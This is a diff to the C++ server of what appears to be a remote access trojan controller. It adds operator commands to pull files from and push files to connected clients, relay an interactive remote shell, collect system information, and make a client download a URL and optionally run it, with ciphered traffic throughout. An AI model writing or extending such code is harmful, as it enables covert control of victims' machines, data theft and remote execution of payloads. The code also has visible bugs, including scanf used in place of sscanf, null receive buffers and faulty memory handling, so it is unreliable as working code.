@@ -23,7 +23,57 @@ void Server::FreeAllClients(){
 	}
 }
 
+bool Server::SendFile(const std::string strRemoteFile, const std::string strLocalFile, int iClientID) {
+	std::cout<<"Sending "<<strLocalFile<<'\n';
+	std::ifstream strmInputFile(strLocalFile, std::ios::binary);
+	if(!strmInputFile.is_open()){
+		std::cout<<"Unable to open file\n";
+		error();
+		return false;
+	}
+	u64 uFileSize = Misc::GetFileSize(strLocalFile);
+	u64 uBytesSent = 0;
+	int iBytes = 0;
+	int iBlockSize = 255;
+	if(uFileSize == 0){
+		strmInputFile.close();
+		return false;
+	}
+	std::string strCmdLine = CommandCodes::cUpload;
+	strCmdLine.append(std::to_string(uFileSize));
+	strCmdLine.append(2, ':');
+	strCmdLine.append(strRemoteFile);
+	if(ssSendBinary(Clients[iClientID]->sckSocket, strCmdLine.c_str(), strCmdLine.length()) > 0){
+		char *cFileBuffer = nullptr;
+		while(uBytesSent<=uFileSize){
+			cFileBuffer = new char[iBlockSize];
+			strmInputFile.read(cFileBuffer, iBlockSize);
+			iBytes = strmInputFile.gcount();
+			if(iBytes > 0){
+				//this maybe gonna cause error, so if it does change  to uBytesSend += iBytes
+				int iTmp = ssSendBinary(Clients[iClientID]->sckSocket, cFileBuffer, iBytes);
+				uBytesSent += iTmp;
+				//progress bar flush
+			} else {
+				break; //no bytes readed end?
+			}
+			delete[] cFileBuffer;
+		}
+		std::cout<<"\nTransfer done\n";
+		delete[] cFileBuffer;
+		cFileBuffer = nullptr;				
+	} else {
+		std::cout<<"Unable to send command to client\n";
+		error();
+		strmInputFile.close();
+		return false;
+	}
+	strmInputFile.close();
+	return true;
+}
+
 bool Server::DownloadFile(const std::string strRemoteFileName, int iClientID){
+	std::cout<<"Downloading file "<<strRemoteFileName<<'\n';
 	std::string cLocalName = "";
 	char cRemoteFileNameCopy[261]; //MAX_PATH under windows is 260 chars
 	strncpy(cRemoteFileNameCopy, strRemoteFileName.c_str(), 260); 
@@ -33,10 +83,74 @@ bool Server::DownloadFile(const std::string strRemoteFileName, int iClientID){
 		tkToken = strtok(nullptr, Clients[iClientID]->strOS == "Windows" ? "\\" : "/");
 	}
 	std::time_t tTime = std::time(nullptr);
+	cLocalName.append(1, ' ');
+	cLocalName.append(Clients[iClientID]->strIP);
+	cLocalName.append(1, ' ');
 	cLocalName.append(std::asctime(std::localtime(&tTime)));
-	Misc::strReplaceSingleChar(cLocalName, ':', '-')
+	cLocalName[cLocalName.length()-1] = '\0';
+	std::cout<<"Local file : "<<cLocalName<<'\n';
+	Misc::strReplaceSingleChar(cLocalName, ':', '-');
+	std::string strCmdLine = CommandCodes::cDownload;
+	strCmdLine.append(strRemoteFileName);
+	if(ssSendBinary(Clients[iClientID]->sckSocket, strCmdLine.c_str(), strCmdLine.length()) > 0){
+		char *cFileBuffer = nullptr;
+		char *cFileSizeBuffer = nullptr;
+		u64 uTotalBytes = 0, uFinalSize = 0;
+		int iBytesRead = 0;
+		if(ssRecvBinary(Clients[iClientID]->sckSocket, cFileSizeBuffer, 20) > 0){
+			if(strcmp(cFileSizeBuffer, "f@0") == 0){
+				std::cout<<"Unable to download remote file\n";
+				delete[] cFileSizeBuffer;
+				cFileSizeBuffer = nullptr;
+				return false;
+			}
+			tkToken = cFileSizeBuffer;
+			tkToken += 2;
+			if(Misc::StrLen(cFileSizeBuffer) > 6){
+				scanf(tkToken, "%li", &uFinalSize);
+			} else {
+				uFinalSize = Misc::StrToUint(tkToken);
+			}
+			std::cout<<"File size is "<<uFinalSize<<'\n';
+			std::ofstream strmOutputFile;
+			strmOutputFile.open(cLocalName, std::ios::binary);
+			if(!strmOutputFile.is_open()){
+				std::cout<<"Unable to open file "<<cLocalName<<"\nOpening /tmp/dummy_file.bin\n";
+				error();
+				strmOutputFile.open("/tmp/dummy_file.bin", std::ios::binary);
+				if(!strmOutputFile.is_open()){
+					std::cout<<"aiiiuudaaaaa\n";
+					error();
+					return false;
+				}	
+			} else {
+				while(uTotalBytes<uFinalSize){
+					iBytesRead = ssRecvBinary(Clients[iClientID]->sckSocket, cFileBuffer, 255);
+					if(iBytesRead > 0){
+						strmOutputFile.write(cFileBuffer, iBytesRead);
+						uTotalBytes += iBytesRead;
+						delete[] cFileBuffer;
+					}
+					//ascii progress bar goes here
+					//flush
+				}
+				strmOutputFile.close();
+				std::cout<<"\nTransfer done!\n";
+			}
+		} else {
+			std::cout<<"Unable to receive remote filesize\n";
+			error();
+			return false;
+		}
+		cFileBuffer = nullptr;
+	} else {
+		std::cout<<"Unable to send command to client\n";
+		error();
+		return false;
+	}
 	return true;
 }
+
 void Server::ParseClientCommand(std::string strCommand, int iClientID){
 	std::vector<std::string> vcClientCommands;
 	Misc::strSplit(strCommand, ' ', vcClientCommands, 10);
@@ -58,7 +172,7 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 					mtxUnlock();
 					std::string strCommandLine = CommandCodes::cShell;
 					strCommandLine.append(vcClientCommands[2]);
-					if(ssSendBinary(Clients[iClientID]->sckSocket, strCommandLine.c_str()) > 0){
+					if(ssSendBinary(Clients[iClientID]->sckSocket, strCommandLine.c_str(), strCommandLine.length()) > 0){
 						//receive confirmation that program is spawned
 						char *cConfirm = nullptr;
 						if(ssRecvBinary(Clients[iClientID]->sckSocket, cConfirm, 4) > 0){
@@ -69,7 +183,7 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 									while(isReadingShell){
 										std::string strShellInput = "";
 										std::getline(std::cin, strShellInput);
-										ssSendBinary(Clients[iClientID]->sckSocket, strShellInput.c_str());
+										ssSendBinary(Clients[iClientID]->sckSocket, strShellInput.c_str(), strShellInput.length());
 									}
 								} else {
 									std::cout<<"Shell not spawned\n";
@@ -98,7 +212,7 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 				if(vcClientCommands[1] == "-b"){
 					//basic information
 					char *cBufferInfo = nullptr;
-					if(ssSendBinary(Clients[iClientID]->sckSocket, CommandCodes::cReqBasicInfo) > 0){
+					if(ssSendBinary(Clients[iClientID]->sckSocket, CommandCodes::cReqBasicInfo, Misc::StrLen(CommandCodes::cReqBasicInfo)) > 0){
 						if(ssRecvBinary(Clients[iClientID]->sckSocket, cBufferInfo, 1024) > 0){
 							//here parse info depending os linux/windows
 							//Clients[iClientID]->strOS == "Linux" ? parseinfolinux : parseinfowindows''
@@ -115,7 +229,7 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 				} else if(vcClientCommands[1] == "-f"){
 					//full information
 					char *cBufferFullInfo = nullptr;
-					if(ssSendBinary(Clients[iClientID]->sckSocket, CommandCodes::cReqFullInfo) > 0){
+					if(ssSendBinary(Clients[iClientID]->sckSocket, CommandCodes::cReqFullInfo, Misc::StrLen(CommandCodes::cReqFullInfo)) > 0){
 						if(ssRecvBinary(Clients[iClientID]->sckSocket, cBufferFullInfo, 2048) > 0){
 							//here parse full info depending wich os
 							//Clients[iClientID]->strOS == "Linux" ? parsefullinfolinux : parsefullinfowindows
@@ -144,13 +258,73 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 					mtxLock();
 					Clients[iClientID]->isFlag = true;
 					mtxUnlock();
-					//procedure to download file
+					DownloadFile(vcClientCommands[2], iClientID); //check return boolean
 					mtxLock();
 					Clients[iClientID]->isFlag = false;
 					mtxUnlock();
 				}
 			}
 			return;
+		}
+		if(vcClientCommands[0] == "upload"){
+			if(vcClientCommands.size() == 5){
+				mtxLock();
+				Clients[iClientID]->isFlag = true;
+				mtxUnlock();
+				std::string strRemoteFile = "";
+				std::string strLocalFile = "";
+				for(u_int iIt2 = 1; iIt2<5; iIt2+=2){
+					if(vcClientCommands[iIt2] == "-l"){
+						strLocalFile = vcClientCommands[iIt2+1];
+						continue;
+					}
+					if(vcClientCommands[iIt2] == "-r"){
+						strRemoteFile = vcClientCommands[iIt2+1];
+					}
+				}
+				if(strRemoteFile != "" && strLocalFile != ""){
+					SendFile(strRemoteFile, strLocalFile, iClientID); //check return boolean
+				} else {
+					std::cout<<"Invalid filenames\n";
+				}
+				mtxLock();
+				Clients[iClientID]->isFlag = false;
+				mtxUnlock();
+			} else {
+				std::cout<<"\n\tUse upload -l local_filename -r remote_filename\n";
+			}
+			return;
+		}
+		if(vcClientCommands[0] == "httpd"){
+			if(vcClientCommands.size() == 5){
+				mtxLock();
+				Clients[iClientID]->isFlag = true;
+				mtxUnlock();
+				std::string strCommandLine = CommandCodes::cHttpd;
+				std::string strUrl = "";
+				u_char cExec;
+				for(u_int iIt2 = 1; iIt2<5; iIt2+=2){
+					if(vcClientCommands[iIt2] == "-u"){
+						strUrl = vcClientCommands[iIt2+1];
+						continue;
+					}
+					if(vcClientCommands[iIt2] == "-r"){
+						cExec = vcClientCommands[iIt2+1] == "yes" ? '1' : '0';
+					}
+				}
+				strCommandLine.append(strUrl);
+				strCommandLine.append(2, ':');
+				strCommandLine.append(1, cExec);
+				if(ssSendBinary(Clients[iClientID]->sckSocket, strCommandLine.c_str(), strCommandLine.length()) > 0){
+					std::cout<<"\n\tSent\n";
+				} else {
+					std::cout<<"Unable to send command to client\n";
+					error();
+				}
+				mtxLock();
+				Clients[iClientID]->isFlag = false;
+				mtxUnlock();
+			}
 		}
 	}
 }
@@ -180,11 +354,11 @@ int Server::ssRecvStr(int sckSocket, std::string& strOutput, int sBytes){
 	return iBytes;
 }
 
-int Server::ssSendBinary(int sckSocket, const char *cData){
+int Server::ssSendBinary(int sckSocket, const char *cData, int sBytes){
 	char *tmpData = nullptr;
 	txtCipher.BinaryCipher(cData, tmpData);
-	int uiDataLen = Misc::StrLen(tmpData);
-	int iBytes = send(sckSocket, tmpData, uiDataLen, 0);
+	//int uiDataLen = Misc::StrLen(tmpData);
+	int iBytes = send(sckSocket, tmpData, sBytes, 0);
 	delete[] tmpData;
 	tmpData = nullptr;
 	return iBytes;
@@ -396,7 +570,7 @@ void threadMasterCMD(Server& srvTMP){
 						}while(strClientCmd != "exit");
 					}else if(strAction == "close"){ //close client conenction
  						if(srvTMP.Clients[iClientId] != nullptr && srvTMP.Clients[iClientId]->isConnected){
-							if((srvTMP.ssSendBinary(srvTMP.Clients[iClientId]->sckSocket,CommandCodes::cClose)) > 0){
+							if((srvTMP.ssSendBinary(srvTMP.Clients[iClientId]->sckSocket,CommandCodes::cClose, Misc::StrLen(CommandCodes::cClose))) > 0){
 								close(srvTMP.Clients[iClientId]->sckSocket);
 							} else {
 								std::cout<<"Unable to send close command\n";
